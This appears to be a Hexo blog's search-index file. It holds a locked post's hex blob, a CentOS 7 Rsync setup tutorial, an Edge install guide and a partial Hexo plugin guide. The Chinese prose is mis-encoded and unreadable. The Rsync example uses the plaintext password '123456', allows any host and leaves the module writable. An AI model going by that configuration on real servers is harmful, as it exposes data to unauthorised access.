8be99917c9c84856b9e383942039e77973dcecc9808c36884679ace8bb5d8b64e1ab273d18d0f5362045176f6f74f7b1ff64ed65ca0692b21839435304810bfd14f9ff2ec035b99bf0c1b3a7393c4c9978acd69bda7a9b7c551a464b3a2791591acd71f6dab219096386d8abcbfb5dd1c4dd5ceac20e0073e54875f80108368e0a5256eee80ea2fe1092a9cf04cf5a2ac6b9cd2f1d1c2a88fd6cdafeb3ba798f1631752b2acc9f69a097f39daffe816a082d324c96f3793145517c1537e667ff9bd6d31b5213a7902093c9aa111bb95b882b0d00c3b4233d8d4718c2c1f546aacc9ff214bbe298cc97280b9faaf1f226efdf14ba4de4c7beeeb8182339f6e82e7a262fe7150ee81e0ce7f2517fc13e2cb72c30a8b590a9d3effc0a0bc0204fc42ce61b240cf597b1734aa9fa6ce5da171f203f3cbf067c8755a072a1a2bafcacb81e2897de260c25710f452554098573d5e6a35c6fe22bb48a270a2d2b0c516dc5096572685284b55cd4bd951a53f30917d29a06f765ccb669f0f735efde450d0a9a2b720d993a6a0cd436de0f1a2e03c32e7d2edf555024e30cae08f3380970ee3c26e51985748d86f7ad1868d0429f9df0b3e359f8001278d07cf8e08154612f3202757d4fc0d85a7f40bd86e21de9c29ca0b8604113f8cb3d4b5c67c96dbed485b7ac6036cbe276c591b716c37ebe2a757727c91c3bd04b31818c40009df81a4d12552c2a174113b3686a91ac72ff2b3e205cd19c752a84353b24f803e30818fc14817b3eca0f11a17e0aceff8a374f68d757c471e8c7a874563a2b28845431ea4c27cf4eae976f2deeee437d1dcb842ea0b9184ced4d1269e4dda2e76b12cbb48c88684fc1b5375eb520d679104dc4a8b1e29c955c42e85820f5a4e1fc35da35fa9e2e5033aa33cae1d031ac45f9a099881a3d57d1cafbb3680b7f46098e4062d8383a2a3d616b6886dd75420eff38c1f658cf958a87a2216988460569a769ff7f03121c06c5e75d4a618162a6ba6502723340889743f3b54119821b8901c97131924d010c6979851900fe3fd64a85a9044cd8508faa41d64b7f6c2ed3c65335bc7626bb26477565d638b6e3bf832098553c788155560839dfd86a413b2b7b26f9b05d941211df8b51e1778c3820d57f17f7b9d5c7c076706cc0bd4c127f9b83d66a93cc3e7e3dcf14d4d2729b7feb6b8acfa0fb3db7d8e2ac20e876f6707e1ed4660f86d144e74f3dde69ba9ed73208c98e2f3af254b534063c252d606e97f82d985785ab29c80185f141fecb3b3f23de72f6e954a7c507de364db9260bcac0f603385cf0318e9f20e30673bbd9cc49ba807ec1153496fec33be67c1a5441388e127c34d22744d3af8564616c101ff605b9dbc809f79b5fb228e9495b023b925369977e5ecd9f95e5e1da012da90ad19cd689676ef15a592d13c9b6703363d90870a693f460767a5612f3482a0392fde04e07aef79053f9bd73fadd965964e5f84f99f03fa41962bc3089402b47b3bdb755bcc4a6b2732b227d4fdfd1d2f2ccf87f0939f1308da381f116a19f25f2931c1ee6c418fad062ea91bfa4b6747a68e8c9ee6972e90c2cb3bf8d01b342d780df520a457d616cd88f48e35d41ec2baaa3121525bd03c98daa28cdad46b7e7ab3a02021c5cf6abce6500e541619a1f21f4283c291c9835bedbe37d74c2dc3490a61b7e7 è¯· è¾“ å…¥ é˜… è¯» å¯† ç .",tags:"åŠ å¯†åšå®¢"},{title:"Centos7 ä½¿ç”¨ Rsync åŒæ­¥æ–‡ä»¶",url:"/posts/a8ab361e.html",text:'å‰è¨€Rsync æ˜¯ä¸€ä¸ªå¢é‡å¤‡ä»½å·¥å…·ï¼Œå¯å‹ç¼©æ•°æ®ä¼ è¾“ï¼Œé€Ÿåº¦å¿«ä¸”å¢é‡å¤‡ä»½ï¼Œå ç”¨æµé‡å°‘ã€‚ å‡†å¤‡å·¥ä½œåˆ›å»ºç”¨æˆ·12345# åˆ›å»ºç”¨æˆ·ç»„# groupadd www# åˆ›å»ºç”¨æˆ·# useradd -g www www -s /bin/false åˆ›å»ºé…ç½®æ–‡ä»¶12# åˆ›å»ºRsyncæœåŠ¡å™¨ä¿¡æ¯æç¤ºæ–‡ä»¶# echo "Welcome To Access" &gt; /etc/rsyncd.motd 123456# åˆ›å»ºRsyncæœåŠ¡å™¨å¯†ç æ–‡ä»¶ï¼Œå…¶ä¸­ RsyncUser æ˜¯ç”¨æˆ·åï¼Œ123456 æ˜¯å¯†ç # echo "RsyncUser:123456" &gt; /etc/rsyncd.secrets# RsyncæœåŠ¡å™¨å¯†ç æ–‡ä»¶æˆæƒï¼Œæ‰€å±çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„å¿…é¡»éƒ½æ˜¯ rootï¼ŒåŒæ—¶æƒé™å¿…é¡»ä¸º 600# chown root:root /etc/rsyncd.secrets# chmod 600 /etc/rsyncd.secrets å®‰è£… Rsyncå®‰è£… Rsync æœåŠ¡12345# å®‰è£…#&nbsp;yum install rsync# å¼€æœºè‡ªå¯åŠ¨# systemctl enable rsyncd æ³¨æ„ è¿™é‡Œè¿˜éœ€è¦æ›´æ”¹ systemd çš„é…ç½®æ–‡ä»¶ï¼ŒåŠ å…¥ä»¥ä¸‹å†…å®¹ï¼Œå¦åˆ™ Rsync æœåŠ¡å¼€æœºæ— æ³•æ­£å¸¸è‡ªå¯åŠ¨ã€‚ 12345678# æ›´æ”¹systemdçš„é…ç½®æ–‡ä»¶ï¼ŒåŠ å…¥ä»¥ä¸‹å†…å®¹# vim /usr/lib/systemd/system/rsyncd.service[Unit]...After=network.target# è®©é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ# systemctl daemon-reload é…ç½® Rsync æœåŠ¡12345# å¤‡ä»½é»˜è®¤çš„é…ç½®æ–‡ä»¶# cp /etc/rsyncd.conf /etc/rsyncd.conf.bak# ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹ï¼ˆè¯·è‡ªè¡Œæ ¹æ®å®é™…æƒ…å†µæ›´æ”¹å¯¹åº”çš„é…ç½®å†…å®¹ï¼‰# vim /etc/rsyncd.conf 1234567891011121314151617181920212223242526272829303132333435363738394041424344# è®¾ç½®æœåŠ¡å™¨ä¿¡æ¯æç¤ºæ–‡ä»¶åç§°ï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­ç¼–å†™æç¤ºä¿¡æ¯motd file = /etc/rsyncd.motd# å¼€å¯Rsyncæ•°æ®ä¼ è¾“æ—¥å¿—åŠŸèƒ½transfer logging = yes# è®¾ç½®æ—¥å¿—æ–‡ä»¶åç§°ï¼Œå¯ä»¥é€šè¿‡log formatå‚æ•°è®¾ç½®æ—¥å¿—æ ¼å¼log file =/var/log/rsyncd.log# è®¾ç½®Rsyncè¿›ç¨‹å·ä¿å­˜æ–‡ä»¶åç§°pid file =/var/run/rsyncd.pid# è®¾ç½®é”æ–‡ä»¶åç§°lock file =/var/run/rsync.lock# è®¾ç½®æœåŠ¡å™¨ç›‘å¬çš„ç«¯å£å·ï¼Œé»˜è®¤ä¸º873 port = 873# è®¾ç½®æœåŠ¡å™¨æ‰€ç›‘å¬ç½‘å¡æ¥å£çš„IPåœ°å€ï¼ˆå†…ç½‘IPï¼‰address = 172.0.25.18# è®¾ç½®è¿›è¡Œæ•°æ®ä¼ è¾“æ—¶æ‰€ä½¿ç”¨çš„è´¦æˆ·åç§°æˆ–IDå·ï¼Œé»˜è®¤ä½¿ç”¨nobody uid = www# è®¾ç½®è¿›è¡Œæ•°æ®ä¼ è¾“æ—¶æ‰€ä½¿ç”¨çš„ç»„åç§°æˆ–GIDå·ï¼Œé»˜è®¤ä½¿ç”¨nobody gid = www# è®¾ç½®user chrootä¸ºyesåï¼Œrsyncä¼šé¦–å…ˆè¿›è¡Œchrootè®¾ç½®ï¼Œå°†æ ¹æ˜ å°„åˆ°pathå‚æ•°è·¯å¾„ä¸‹ï¼Œå¯¹å®¢æˆ·ç«¯è€Œè¨€ï¼Œç³»ç»Ÿçš„æ ¹å°±æ˜¯pathå‚æ•°æ‰€æŒ‡å®šçš„è·¯å¾„ã€‚ä½†è¿™æ ·åšéœ€è¦rootæƒé™ï¼Œå¹¶ä¸”åœ¨åŒæ­¥ç¬¦å·è¿æ¥èµ„æ–™æ—¶ä»…ä¼šåŒæ­¥åç§°ï¼Œè€Œå†…å®¹å°†ä¸ä¼šåŒæ­¥ã€‚ use chroot = no# æ˜¯å¦å…è®¸å®¢æˆ·ç«¯ä¸Šä¼ æ•°æ®ï¼Œè¿™é‡Œè®¾ç½®ä¸ä¸ºåªè¯»ã€‚ read only = no# è®¾ç½®å¹¶å‘è¿æ¥æ•°ï¼Œ0ä»£è¡¨æ— é™åˆ¶ã€‚è¶…å‡ºå¹¶å‘æ•°åï¼Œå¦‚æœä¾ç„¶æœ‰å®¢æˆ·ç«¯è¿æ¥è¯·æ±‚ï¼Œåˆ™å°†ä¼šæ”¶åˆ°ç¨åé‡è¯•çš„æç¤ºæ¶ˆæ¯ max connections = 10# æ¨¡å—ï¼ŒRsyncé€šè¿‡æ¨¡å—å®šä¹‰åŒæ­¥çš„ç›®å½•ï¼Œæ¨¡å—ä»¥[name]çš„å½¢å¼å®šä¹‰ï¼Œè¿™ä¸Sambaå®šä¹‰å…±äº«ç›®å½•æ˜¯ä¸€æ ·çš„æ•ˆæœï¼Œåœ¨Rsyncä¸­ä¹Ÿå¯ä»¥å®šä¹‰å¤šä¸ªæ¨¡å—[blog]# commentå®šä¹‰æ³¨é‡Šè¯´æ˜å­—ä¸² comment = rsync blog files# åŒæ­¥ç›®å½•çš„çœŸå®è·¯å¾„é€šè¿‡pathæŒ‡å®š path = /home/www/blog# å¿½ç•¥ä¸€äº›IOé”™è¯¯ ignore errors# excludeå¯ä»¥æŒ‡å®šä¾‹å¤–çš„ç›®å½•ï¼Œå³å°†commonç›®å½•ä¸‹çš„æŸä¸ªç›®å½•è®¾ç½®ä¸ºä¸åŒæ­¥æ•°æ® # exclude = test/ # è®¾ç½®å…è®¸è¿æ¥æœåŠ¡å™¨çš„è´¦æˆ·ï¼Œè´¦æˆ·å¯ä»¥æ˜¯ç³»ç»Ÿä¸­ä¸å­˜åœ¨çš„ç”¨æˆ· auth users = RsyncUser# è®¾ç½®å¯†ç æ–‡ä»¶åç§°ï¼Œæ³¨æ„è¯¥æ–‡ä»¶çš„æƒé™è¦æ±‚ä¸ºåªè¯»ï¼Œå»ºè®®æƒé™ä¸º600ï¼Œä»…åœ¨è®¾ç½®auth userså‚æ•°åæœ‰æ•ˆ secrets file = /etc/rsyncd.secrets# è®¾ç½®å…è®¸å“ªäº›ä¸»æœºå¯ä»¥åŒæ­¥æ•°æ®ï¼Œå¯ä»¥æ˜¯å•ä¸ªIPï¼Œä¹Ÿå¯ä»¥æ˜¯ç½‘æ®µï¼Œå¤šä¸ªIPä¸ç½‘æ®µä¹‹é—´ä½¿ç”¨ç©ºæ ¼åˆ†éš” hosts allow = *# è®¾ç½®æ‹’ç»æ‰€æœ‰ï¼ˆé™¤hosts allowå®šä¹‰çš„ä¸»æœºå¤–ï¼‰ # hosts deny = *# å®¢æˆ·ç«¯è¯·æ±‚æ˜¾ç¤ºæ¨¡å—åˆ—è¡¨æ—¶ï¼Œæœ¬æ¨¡å—åç§°æ˜¯å¦æ˜¾ç¤ºï¼Œé»˜è®¤ä¸ºtrue list = true å¯åŠ¨ Rsync æœåŠ¡12345# å¯åŠ¨æœåŠ¡# systemctl start rsyncd# æŸ¥çœ‹æœåŠ¡çš„è¿è¡ŒçŠ¶æ€# systemctl status rsyncd å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç®¡ç† Rsync æœåŠ¡ï¼š 12345# å…³é—­æœåŠ¡# systemctl stop rsyncd# é‡å¯æœåŠ¡# systemctl restart rsyncd é…ç½®ç³»ç»Ÿé˜²ç«å¢™12345678# å¼€æ”¾Rsyncç›‘å¬çš„ç«¯å£ï¼ˆé»˜è®¤ç«¯å£æ˜¯873ï¼‰# firewall-cmd --permanent --add-port=873/tcp# è®©é˜²ç«å¢™è§„åˆ™ç”Ÿæ•ˆ# firewall-cmd --reload# æŸ¥çœ‹æ‰€æœ‰å¼€æ”¾çš„ç«¯å£# firewall-cmd --list-ports æµ‹è¯•æ–‡ä»¶åŒæ­¥æœåŠ¡æç¤º åœ¨ä¸‹è¿°çš„æ¡ˆä¾‹é‡Œï¼Œå„å‘½ä»¤å‚æ•°çš„è¯´æ˜å¦‚ä¸‹ï¼š 183.242.11.186ï¼šæœåŠ¡å™¨çš„ IP åœ°å€ blogï¼šåœ¨ /etc/rsyncd.conf é…ç½®æ–‡ä»¶ä¸­å®šä¹‰çš„æ¨¡å—åç§° RsyncUserï¼šåœ¨ /etc/rsyncd.secrets é…ç½®æ–‡ä»¶ä¸­å®šä¹‰çš„ç”¨æˆ·å --deleteï¼šè¡¨ç¤ºåŒæ­¥æ–‡ä»¶æ—¶ï¼Œåˆ é™¤ç›®æ ‡ç›®å½•æ¯”æºç›®å½•å¤šä½™çš„æ–‡ä»¶ åŒæ­¥ç›®å½•æˆæƒåœ¨æœåŠ¡å™¨ä¸Šï¼Œç¡®ä¿ç”¨æˆ·æ‹¥æœ‰åœ¨ /etc/rsyncd.conf é…ç½®æ–‡ä»¶ä¸­å®šä¹‰çš„ path åŒæ­¥ç›®å½•çš„è®¿é—®æƒé™ã€‚ 12# åŒæ­¥ç›®å½•æˆæƒ# chown -R www:www /home/www/blog å®¢æˆ·ç«¯åŒæ­¥æœåŠ¡å™¨æ–‡ä»¶åˆ°æœ¬åœ°12345# å®¢æˆ·ç«¯åŒæ­¥æœåŠ¡å™¨çš„æŸä¸ªæ–‡ä»¶åˆ°æœ¬åœ°$ rsync -vzrtopg --progress RsyncUser@183.242.11.186::blog/index.html ./# å®¢æˆ·ç«¯åŒæ­¥æœåŠ¡å™¨çš„æŸä¸ªç›®å½•åˆ°æœ¬åœ°$ rsync -vzrtopg --progress RsyncUser@183.242.11.186::blog/posts/ ./posts/ å®¢æˆ·ç«¯åŒæ­¥æœ¬åœ°æ–‡ä»¶åˆ°æœåŠ¡å™¨12345678# å®¢æˆ·ç«¯åŒæ­¥æœ¬åœ°çš„æŸä¸ªæ–‡ä»¶åˆ°æœåŠ¡å™¨$ rsync -rlptDv index.html RsyncUser@183.242.11.186::blog/# å®¢æˆ·ç«¯åŒæ­¥æœ¬åœ°çš„æŸä¸ªç›®å½•åˆ°æœåŠ¡å™¨ï¼ˆæœ¬åœ°çš„ç›®å½•è·¯å¾„å¿…é¡»ä¸ä»¥\'/\'ç»“å°¾ï¼‰$ rsync -avzP --delete ./posts RsyncUser@183.242.11.186::blog/# å®¢æˆ·ç«¯åŒæ­¥æœ¬åœ°æŸä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼ˆæœ¬åœ°çš„ç›®å½•è·¯å¾„å¿…é¡»ä»¥\'/\'ç»“å°¾ï¼‰$ rsync -avzP --delete ./posts/ RsyncUser@183.242.11.186::blog/ è®¾ç½®åŒæ­¥æ—¶ä¸æ‰‹åŠ¨è¾“å…¥å¯†ç åœ¨å®¢æˆ·ç«¯åŒæ­¥æ–‡ä»¶æ—¶æŒ‡å®šå¯†ç æ–‡ä»¶ï¼Œè¿™æ ·å¯ä»¥é¿å…æ¯æ¬¡éƒ½æ‰‹åŠ¨è¾“å…¥å¯†ç ã€‚ 123456# åœ¨æœ¬åœ°åˆ›å»ºå¯†ç æ–‡ä»¶ï¼Œå…¶ä¸­ 123456 æ˜¯å¯†ç ï¼Œè¿™é‡Œä¸éœ€è¦æŒ‡å®šç”¨æˆ·å# echo "123456" &gt; /etc/rsyncd.password# å¯†ç æ–‡ä»¶æˆæƒï¼Œæ‰€å±çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„å¿…é¡»éƒ½æ˜¯ rootï¼ŒåŒæ—¶æƒé™å¿…é¡»ä¸º 600# chown root:root /etc/rsyncd.password# chmod 600 /etc/rsyncd.password 12# å®¢æˆ·ç«¯åŒæ­¥æœåŠ¡å™¨çš„æŸä¸ªæ–‡ä»¶åˆ°æœ¬åœ°ï¼ˆæŒ‡å®šå¯†ç æ–‡ä»¶ï¼‰# rsync -vzrtopg --progress RsyncUser@183.242.11.186::blog/index.html ./ --password-file=/etc/rsyncd.password æç¤º é™¤äº†ä¸Šè¿°çš„æ–¹æ³•ä¹‹å¤–ï¼Œè¿˜å¯é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡çš„æ–¹å¼ï¼Œé¿å…æ¯æ¬¡éƒ½æ‰‹åŠ¨è¾“å…¥å¯†ç ã€‚ 12345# é€šè¿‡ç¯å¢ƒå˜é‡è®¾ç½®å¯†ç # export RSYNC_PASSWORD="123456"# å®¢æˆ·ç«¯åŒæ­¥æœåŠ¡å™¨çš„æŸä¸ªæ–‡ä»¶åˆ°æœ¬åœ°# rsync -vzrtopg --progress RsyncUser@183.242.11.186::blog/index.html ./ ä¸åŒæ­¥æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œç”¨æˆ·ç»„ä¿¡æ¯åœ¨ rsync -a dir/ remote:/dir/ å‘½ä»¤ä¸­ï¼Œ-a ç›¸å½“äº -rlptgoDï¼Œå„å‚æ•°é€‰é¡¹çš„è¯´æ˜å¦‚ä¸‹ï¼š 123456789-o, --owner preserve owner (super-user only)-g, --group preserve group-r, --recursive recurse into directories-l, --links copy symlinks as symlinks-p, --perms preserve permissions-t, --times preserve modification times-D same as --devices --specials --devices preserve device files (super-user only) --specials preserve special files è‹¥å¸Œæœ›ä¸åŒæ­¥æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œç”¨æˆ·ç»„ä¿¡æ¯ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡ç§»é™¤ -o å’Œ -g å‚æ•°é€‰é¡¹æ¥å®ç°ï¼Œç¤ºä¾‹å‘½ä»¤å¦‚ä¸‹ï¼š 1$ rsync -a --no-o --no-g dir/ remote:/dir/ ç”¨å‚æ•°æ§åˆ¶ Rsync åŒæ­¥æ—¶çš„æ¯”è¾ƒç®—æ³•Rsync é»˜è®¤åªä¼šæ¯”è¾ƒæ–‡ä»¶å¤§å°å’Œæœ€åä¿®æ”¹æ—¶é—´ï¼Œåªè¦è¿™ä¸¤è€…ä¸€æ ·ï¼ŒRsync å°±è®¤ä¸ºæ–‡ä»¶ç›¸åŒï¼›æ­¤æ—¶å¦‚æœå…¶å®ƒå±æ€§ï¼ˆåŒ…æ‹¬æ–‡ä»¶å†…å®¹ï¼‰çš„ä¸åŒï¼Œå¹¶ä¸ä¼šè®© Rsync åŒæ­¥è¯¥æ–‡ä»¶ã€‚æ‰€ä»¥ï¼Œå¦‚æœæœ¬åœ°æ–‡ä»¶ä¸è¿œç¨‹æ–‡ä»¶å¤§å°ä¸€æ ·ï¼Œä¿®æ”¹æ—¶é—´ä¹Ÿä¸€æ ·ï¼Œé‚£ä¹ˆé»˜è®¤æƒ…å†µä¸‹ï¼Œå³ä½¿æ–‡ä»¶å†…å®¹ä¸ä¸€æ ·çš„æ–‡ä»¶ä¹Ÿä¸åŒè¢«åŒæ­¥ã€‚é€šè¿‡è®¾ç½®åˆé€‚çš„å‚æ•°ï¼Œå¯ä»¥æ§åˆ¶ Rsync çš„æ¯”è¾ƒç®—æ³•ï¼Œå…¶ä¸­ Rsync ä½¿ç”¨ä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤æ¥æ¯”è¾ƒæ–‡ä»¶ï¼š a) æ¯”è¾ƒæ–‡ä»¶å¤§å° b) æ¯”è¾ƒæ–‡ä»¶æœ€åä¿®æ”¹æ—¥æœŸ c) æ¯”è¾ƒæ–‡ä»¶å†…å®¹ï¼Œé€šè¿‡ checksumï¼Œä¾‹å¦‚ä½¿ç”¨ md5sum å¯ä»¥ç”¨å‚æ•°æ¥æ§åˆ¶ Rsync æ‰§è¡Œä¸Šé¢çš„å“ªäº›æ­¥éª¤ï¼š é»˜è®¤çš„æ¯”è¾ƒç®—æ³•åªæ‰§è¡Œ a å’Œ b å‚æ•° --size-only åªæ£€æŸ¥ a ï¼Œå³åªè¦æ–‡ä»¶å¤§å°ä¸€æ ·ï¼Œå³ä½¿ä¿®æ”¹æ—¥æœŸä¸ä¸€æ ·ï¼Œå°±è®¤ä¸ºæ–‡ä»¶ä¸€æ ·ï¼Œæ›´ä¸ä¼šå»æ£€æŸ¥æ–‡ä»¶å†…å®¹ å‚æ•° --ignore-times æ˜¯å¿½ç•¥æ‰€æœ‰æ£€æŸ¥ï¼Œç›´æ¥è®¤ä¸ºæ–‡ä»¶éƒ½ä¸ä¸€æ ·ï¼Œç„¶åæ€»æ˜¯å¤åˆ¶æ–‡ä»¶ å‚æ•° --checksum æ˜¯åœ¨ a çš„åŸºç¡€ä¸Šæ‰§è¡Œ c ï¼Œæ¯”è¾ƒæ–‡ä»¶å†…å®¹ã€‚å¦‚æœæ–‡ä»¶å¤§å°ä¸ä¸€æ ·ï¼Œå¯ä»¥ç¡®ä¿å†…å®¹ä¸ä¸€æ ·ã€‚å¦‚æœæ–‡ä»¶å¤§å°ä¸€æ ·ï¼Œé‚£ä¹ˆç›´æ¥æ¯”è¾ƒæ–‡ä»¶å†…å®¹ï¼Œä¸ä¼šæ‰§è¡Œ b ä¸­çš„æ¯”è¾ƒæœ€åä¿®æ”¹æ—¶é—´ã€‚è¯¥æ–¹æ³•æœ€å®‰å…¨ï¼Œä½†éœ€è¦è¯»å–ä¸¤è¾¹çš„æ–‡ä»¶å†…å®¹ï¼ŒæŸäº›æƒ…å†µä¸‹è¦æ…¢å¾ˆå¤šï¼ˆå°¤å…¶æ˜¯æœ€åæ¯”è¾ƒå‡ºæ¥çš„æ–‡ä»¶å†…å®¹ä¸€æ ·çš„æƒ…å†µï¼‰ å‘½ä»¤å‚æ•°çš„ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š 1$ rsync -avzP --delete --checksum dir/ remote:/dir/ å¸¸è§é—®é¢˜delete å‚æ•°ä¸ç”Ÿæ•ˆ Rsync â€“delete option doesnâ€™t delete files in target directory var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Centos7 å®‰è£… Edge æµè§ˆå™¨",url:"/posts/350db602.html",text:'ä¸‹è½½åœ¨ Edge çš„ å®˜ç½‘ï¼Œæ‰‹åŠ¨ä¸‹è½½æœ€æ–°ç‰ˆçš„ RPM å®‰è£…åŒ…ï¼Œæˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œä¸‹è½½ï¼š 1$ wget https://packages.microsoft.com/yumrepos/edge/microsoft-edge-dev-101.0.1193.0-1.x86_64.rpm å®‰è£…ä¾èµ–1# yum install libatomic æç¤º è‹¥ä¸æå‰å®‰è£… libatomic åº“ï¼Œåˆ™å®‰è£… Edge æ—¶ä¼šå‡ºç°ä»¥ä¸‹é”™è¯¯ä¿¡æ¯ã€‚ 123é”™è¯¯ï¼šä¾èµ–æ£€æµ‹å¤±è´¥ï¼š libatomic.so.1()(64bit) è¢« microsoft-edge-dev-101.0.1193.0-1.x86_64 éœ€è¦ libatomic.so.1(LIBATOMIC_1.0)(64bit) è¢« microsoft-edge-dev-101.0.1193.0-1.x86_64 éœ€è¦ å®‰è£… Edge æµè§ˆå™¨1# rpm -ivh microsoft-edge-dev-101.0.1193.0-1.x86_64.rpm var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"Hexo åšå®¢å¯¼æµå¾®ä¿¡å…¬ä¼—å·",url:"/posts/c86372a2.html",text:"å‰è¨€Hexo åšå®¢å»ºè®®å®‰è£… hexo-readmore æ’ä»¶ï¼Œå°† TechGrow çš„å…è´¹å¾®ä¿¡å…¬ä¼—å·å¯¼æµå·¥å…·æ•´åˆåˆ°åšå®¢ä¸­ï¼Œç”¨æˆ·æ‰«ç å…³æ³¨å¾®ä¿¡å…¬ä¼—å·åå¯ä»¥è§£é”å…¨ç«™æ–‡ç« ï¼Œè®©å¾®ä¿¡å…¬ä¼—å·çš„ç²‰ä¸æ•°èººç€å¢é•¿ã€‚ æç¤º TechGrow å¼€æ”¾å¹³å°çš„ å®˜æ–¹æ–‡æ¡£ ç‰¹è‰²åŠŸèƒ½ å…¼å®¹ä¸»æµçš„ Hexo ä¸»é¢˜ æ”¯æŒéšæœºä¸ºåšå®¢æ·»åŠ å¼•æµåŠŸèƒ½ æ”¯æŒå…³é—­æŸç¯‡æ–‡ç« çš„å¼•æµåŠŸèƒ½ æ”¯æŒæŸ¥è¯¢ç”¨æˆ·è§£é”æ–‡ç« çš„å†å²è®°å½• æ”¯æŒè‡ªå®šä¹‰æˆ–è€…åŠ¨æ€è®¡ç®—æ–‡ç« å†…å®¹çš„é¢„è§ˆé«˜åº¦ æ”¯æŒè‡ªå®šä¹‰ CSS æ ·å¼ï¼Œè½»æ¾é€‚é…ä¸åŒé£æ ¼çš„åšå®¢ æ³¨å†Œåšå®¢æµè§ˆå™¨è®¿é—® TechGrow çš„å®˜ç½‘ ï¼Œæ³¨å†Œå¹¶ç™»å½•è´¦å·åï¼Œè¿›å…¥åšå®¢çš„åå°ç®¡ç†é¡µé¢ã€‚é¦–å…ˆç‚¹å‡»å·¦ä¾§çš„èœå• åšå®¢æ³¨å†Œï¼Œç„¶åç‚¹å‡» æ–°å¢ æŒ‰é’®ï¼Œæ·»åŠ è‡ªå·±åšå®¢çš„ä¿¡æ¯ã€‚åšå®¢æ³¨å†ŒæˆåŠŸåï¼Œè®°å½•ä¸‹ åšå®¢ IDï¼Œåé¢çš„æ­¥éª¤ä¼šä½¿ç”¨åˆ° è®¾ç½®å…¬ä¼—å·åœ¨å¾®ä¿¡å…¬ä¼—å·çš„åå°ç®¡ç†é¡µé¢ï¼Œèœå•æ é‡Œé€‰æ‹© è‡ªåŠ¨å›å¤ - å…³é”®è¯å›å¤ï¼Œå¯ç”¨ è‡ªåŠ¨å›å¤ï¼Œç„¶åç‚¹å‡» æ·»åŠ å›å¤ æŒ‰é’®ï¼š å¡«å†™ è§„åˆ™åç§°ã€å…³é”®è¯ï¼ˆå½“åˆä½ åœ¨ TechGrow ä¸­è®¾ç½®çš„ï¼‰ã€å›å¤å†…å®¹ é€‰æ‹© æ–‡å­—ï¼Œç„¶å å›å¤æ–‡å­— çš„å†…å®¹å¡«å†™è·å–åšå®¢è§£é”éªŒè¯ç çš„é“¾æ¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼ˆè¯·è‡ªè¡Œæ›´æ”¹ xxxxx-xxxxxxxxx-xxx ä¸ºä½ ç”³è¯·åˆ°çš„åšå®¢ IDï¼‰ 1&lt;a href=\"https://open.techgrow.cn/#/readmore/captcha/generate?blogId=xxxxx-xxxxxxxxx-xxx\"&gt;ç‚¹å‡»é“¾æ¥ï¼Œè·å–åšå®¢è§£é”éªŒè¯ç &lt;/a&gt; æ­¤æ—¶ï¼Œå½“è¯»è€…å…³æ³¨ä½ çš„å¾®ä¿¡å…¬ä¼—å·ï¼Œå¹¶è¾“å…¥å…³é”®è¯åï¼ˆæ¯”å¦‚æˆ‘è®¾ç½®çš„å…³é”®è¯å°±æ˜¯ techï¼‰ï¼Œé‚£ä¹ˆè¯»è€…å°±ä¼šè‡ªåŠ¨æ¥æ”¶åˆ°è·å–åšå®¢è§£é”éªŒè¯ç çš„é“¾æ¥ å®‰è£…æ’ä»¶ è¿è¡Œ npm install å‘½ä»¤å®‰è£…æ’ä»¶åˆ°æœ¬åœ°é¡¹ç›® 1$ npm install hexo-readmore --save é…ç½® Hexoç¼–è¾‘ Hexo è‡ªèº«çš„ _config.yml é…ç½®æ–‡ä»¶ï¼Œæ–°å¢æ’ä»¶çš„é…ç½®ä¿¡æ¯ï¼ˆè¯·è‡ªè¡Œæ›´æ”¹åšå®¢ç›¸å…³çš„ä¿¡æ¯ï¼‰ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314151617181920212223readmore: # æ˜¯å¦å¯ç”¨ enable: true # å·²ç”³è¯·çš„åšå®¢ ID blogId: '18762-1609305354821-257' # å·²ç”³è¯·çš„å¾®ä¿¡å…¬ä¼—å·åç§° name: 'å…¨æ ˆæŠ€æœ¯é©¿ç«™' # å·²ç”³è¯·çš„å¾®ä¿¡å…¬ä¼—å·å›å¤å…³é”®è¯ keyword: 'tech' # å·²ç”³è¯·çš„å¾®ä¿¡å…¬ä¼—å·äºŒç»´ç å›¾ç‰‡ qrcode: 